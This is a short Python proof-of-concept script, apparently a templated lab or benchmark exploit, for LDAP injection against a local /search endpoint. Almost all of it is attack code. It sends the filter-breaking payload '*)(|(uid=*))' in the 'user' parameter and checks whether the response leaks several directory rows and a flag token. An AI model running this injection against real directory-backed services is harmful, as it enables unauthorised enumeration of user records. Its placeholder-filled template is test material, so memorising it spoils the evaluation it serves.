import argparse
import sys
import requests

SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
FLAG_TOKEN = '__FLAG_TOKEN__'
DEFAULT_PAYLOAD = '*)(|(uid=*))'


def exploit(base_url: str, payload: str) -> bool:
    url = base_url.rstrip('/') + '/search'
    try:
        resp = requests.get(url, params={'user': payload}, timeout=5)
        resp.raise_for_status()
    except requests.RequestException as exc:
        print(f'[ldapi-compiler] request failed: {exc}', file=sys.stderr)
        return False
    try:
        payload = resp.json()
    except ValueError:
        return False
    rows = payload.get('rows') or []
    return int(payload.get('count') or 0) >= 2 and str(payload.get('flag')) == FLAG_TOKEN and len(rows) >= 2


def main() -> None:
    parser = argparse.ArgumentParser(description='LDAP Injection compiler PoC')
    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)
    args = parser.parse_args()
    if exploit(args.base_url, args.payload):
        print(SUCCESS_SIGNATURE)
        print(FLAG_TOKEN)
        raise SystemExit(0)
    print('[ldapi-compiler] exploit did not succeed', file=sys.stderr)
    raise SystemExit(1)


if __name__ == '__main__':
    main()
